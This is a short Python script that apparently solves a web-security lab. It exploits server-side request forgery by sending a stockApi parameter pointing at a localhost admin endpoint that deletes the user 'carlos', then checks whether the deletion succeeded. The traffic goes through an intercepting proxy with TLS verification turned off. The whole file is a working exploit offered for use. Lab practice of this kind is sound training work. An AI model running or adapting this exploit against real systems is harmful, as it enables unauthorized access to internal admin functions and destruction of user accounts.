import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

def ssrf_exploit(url):
    payload_url = "http://localhost/admin/delete?username=carlos"
    app_path = "/product/stock"

    post_res = requests.post(url+app_path, data={"stockApi": payload_url}, proxies=proxies, verify=False )

    # check if user got deleted
    path_admin_panel = "http://localhost/admin"

    admin_panel_res = requests.post(url+app_path, data={"stockApi": path_admin_panel}, proxies=proxies, verify=False)

    if 'User deleted sucessfully!' in admin_panel_res.text:
        return True
    else:
        return False 


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] invaid input")
        print("[-] usage: %s <url>"%sys.argv[0])
        print("exiting...")
        sys.exit(-1)

    ssrf_sucess = ssrf_exploit(url)

    if ssrf_sucess:
        print("[+] attack done - deleted user")       
        sys.exit(-1)
    else:
        print("[-] attack failed")
        sys.exit(-1)